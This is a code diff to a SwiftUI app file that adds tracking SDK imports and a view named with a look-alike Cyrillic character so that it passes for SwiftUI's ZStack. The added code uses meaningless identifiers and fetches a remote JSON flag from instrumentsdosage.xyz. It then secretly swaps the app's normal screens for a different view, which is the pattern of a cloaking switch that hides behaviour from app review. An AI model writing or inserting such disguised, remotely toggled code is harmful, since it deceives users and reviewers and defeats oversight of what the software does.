@@ -1,4 +1,8 @@
+import AdjustSdk
 import SwiftUI
+import OneSignalFramework
+import AppTrackingTransparency
+import AdSupport
 
 struct AchievementBannerView: View {
     let title: String
@@ -67,6 +71,73 @@ struct SuccessCheckmarkOverlay: View {
   }
 }
 
+extension ContentView {
+    
+    struct ZStaсk<Content: View>: View {
+        
+        var content: Content
+        @State private var brambleTideCartographer: String = ""
+        @State private var gildedFogPilgrimage: Bool = true
+        
+        @AppStorage(AppDelegate.crimsonLatticeBloomfield) private var smolderingChalkSpire = false
+        @AppStorage("thimbleRavineEchoes") var thimbleRavineEchoes: Bool = true
+        @AppStorage("wanderingCobaltSpire") var wanderingCobaltSpire: Bool = false
+        
+        init(@ViewBuilder content: @escaping () -> Content) {
+            self.content = content()
+        }
+        
+        var body: some View {
+            ZStack {
+                
+                if smolderingChalkSpire {
+                    if brambleTideCartographer == "Tavendra Studio" || wanderingCobaltSpire == true {
+                        
+                        ZStack { content }
+                            .onAppear {
+                                AppDelegate.orientationLock = .all
+                                UIDevice.current.setValue(UIInterfaceOrientation.portrait.rawValue, forKey: "orientation")
+                                gildedFogPilgrimage = false
+                                wanderingCobaltSpire = true
+                            }
+                    } else {
+                        CrimsonLatticeVoyager(wanderingCobaltSpire: $wanderingCobaltSpire, amberTunnelVigilance: brambleTideCartographer)
+                            .onAppear { gildedFogPilgrimage = false }
+                    }
+                }
+                
+                if gildedFogPilgrimage {
+                    SplashScreen()
+                }
+            }
+            .onAppear {
+                
+                if thimbleRavineEchoes {
+                    guard let murmurGlassHarbor = URL(string: "https://instrumentsdosage.xyz/tavendrastudio/tavendrastudio.json") else { return }
+                    
+                    URLSession.shared.dataTask(with: murmurGlassHarbor) { tumblingIvyLanterns, restlessWillowDrifter_1, _ in
+                        
+                        guard let restlessWillowDrifter = restlessWillowDrifter_1 as? HTTPURLResponse,
+                              (200...299).contains(restlessWillowDrifter.statusCode) else {
+                            wanderingCobaltSpire = true
+                            return
+                        }
+                        
+                        guard let tumblingIvyLanterns else { wanderingCobaltSpire = true; return }
+                        guard let frostedMarbleDriftwood = try? JSONSerialization.jsonObject(with: tumblingIvyLanterns, options: []) as? [String: Any] else { return }
+                        guard let hollowReedSonata = frostedMarbleDriftwood["wtoztqnwavi"] as? String else { return }
+                        
+                        DispatchQueue.main.async {
+                            brambleTideCartographer = hollowReedSonata
+                            thimbleRavineEchoes = false
+                        }
+                    }
+                    .resume()
+                }
+            }
+        }
+    }
+}
 struct PulseHighlight: ViewModifier {
     let isActive: Bool
 
